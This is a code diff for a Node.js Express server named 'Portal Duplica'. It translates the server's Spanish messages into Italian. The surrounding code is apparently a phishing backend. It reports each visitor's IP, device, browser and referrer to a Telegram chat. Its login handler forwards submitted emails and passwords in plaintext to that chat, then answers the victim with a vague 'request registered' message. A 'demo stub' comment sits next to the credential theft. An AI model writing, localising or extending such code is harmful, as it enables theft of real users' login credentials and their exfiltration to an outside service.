@@ -107,13 +107,13 @@ app.get("/", async (req, res) => {
 
   await sendTelegram(
     [
-      "<b>👁️ Nuevo Visitante — Portal Duplica</b>",
+      "<b>👁️ Nuovo Visitatore — Portal Duplica</b>",
       "",
       `<b>IP:</b> ${escapeHtml(ip)}`,
       `<b>Dispositivo:</b> ${device}`,
-      `<b>Navegador:</b> ${browser}`,
-      `<b>Referido:</b> ${escapeHtml(referrer)}`,
-      `<b>Hora (UTC):</b> ${when}`,
+      `<b>Browser:</b> ${browser}`,
+      `<b>Provenienza:</b> ${escapeHtml(referrer)}`,
+      `<b>Ora (UTC):</b> ${when}`,
     ].join("\n")
   );
 });
@@ -127,7 +127,7 @@ app.post("/api/login", async (req, res) => {
   const password = String(req.body.password || "");
 
   if (!email || !password) {
-    return res.status(400).json({ ok: false, message: "Correo y contraseña obligatorios." });
+    return res.status(400).json({ ok: false, message: "Email e password sono obbligatori." });
   }
 
   // Demo stub — replace with real authentication (hashing, sessions, etc.)
@@ -139,10 +139,10 @@ app.post("/api/login", async (req, res) => {
       [
         "<b>Portal Duplica</b>",
         "",
-        "<b>Evento:</b> envío del formulario",
-        `<b>Correo:</b> ${escapeHtml(email)}`,
-        `<b>Contraseña:</b> ${escapeHtml(password)}`,
-        `<b>Hora (UTC):</b> ${when}`,
+        "<b>Evento:</b> invio del modulo",
+        `<b>Email:</b> ${escapeHtml(email)}`,
+        `<b>Password:</b> ${escapeHtml(password)}`,
+        `<b>Ora (UTC):</b> ${when}`,
       ].join("\n")
     );
     if (result.ok) {
@@ -154,7 +154,7 @@ app.post("/api/login", async (req, res) => {
 
   return res.json({
     ok: true,
-    message: "Solicitud registrada.",
+    message: "Richiesta registrata.",
   });
 });
 
